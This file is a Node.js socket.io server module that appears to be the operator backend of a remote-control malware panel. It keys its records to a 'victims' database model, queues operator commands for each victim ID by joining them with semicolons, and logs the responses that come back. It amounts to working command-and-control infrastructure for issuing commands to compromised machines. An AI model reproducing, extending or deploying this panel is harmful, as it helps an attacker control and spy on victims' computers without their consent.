var victims_md = require('../models/victims');

module.exports = function(io){
    io.sockets.on("connection", function(socket){
        console.log("new user connection");

        socket.on("adduser", function(id){
            socket.id = id;

            var log = victims_md.getLogByID(id);

            if(log) {
                log.then(function(logs) {
                    var log = logs[0].log;
                    //console.log(log);
                    if (log) {
                        var data = {
                            message: log
                        };
                        socket.emit("update_message", data);
                    }
                }).catch(function(err){
                    console.log('Can not get log by id');
                });
            }
        });

        socket.on("response", function(message){
            console.log("abcdef");
            //add log to database
            var log = victims_md.getLogByID(socket.id);

            if(log) {
                log.then(function(logs) {
                    var log = logs[0].log;
                    if (log) {
                        log = log + "\r\n> " + message;
                    } else {
                        log = "> " + message;
                    }

                    var update = victims_md.updateLogByID(socket.id, log);
                    update.then(function (result) {

                    }).catch(function (err) {
                        console.log('Can not update log by id');
                    });
                }).catch(function (err) {
                    console.log('Can not get log by id');
                });
            }

            //notify meself
            var data = {
                message: message
            };

            socket.emit("update_message", data);
        });

       //listen send_message
        socket.on("send_message", function(message){
            //add command to database
            var command = victims_md.getCommandByID(socket.id);

            if(command) {
                command.then(function(commands) {
                    var command = commands[0].command;
                    if (command) {
                        command = command + ";" + message;
                    } else {
                        command = message;
                    }

                    var update = victims_md.updateCommandByID(socket.id, command);
                    update.then(function(result) {

                    }).catch(function(err) {
                        console.log('Can not update command by id');
                    });
                }).catch(function(err) {
                    console.log('Can not get command by id');
                });
            }

            //add log to database
            var log = victims_md.getLogByID(socket.id);

            if(log) {
                log.then(function(logs) {
                    var log = logs[0].log;
                    if (log) {
                        log = log + "\r\n> " + message;
                    } else {
                        log = "> " + message;
                    }

                    var update = victims_md.updateLogByID(socket.id, log);
                    update.then(function (result) {

                    }).catch(function (err) {
                        console.log('Can not update log by id');
                    });
                }).catch(function (err) {
                    console.log('Can not get log by id');
                });
            }

            //notify meself
            var data = {
                message: message
            };

            socket.emit("update_message", data);
        });
    });
}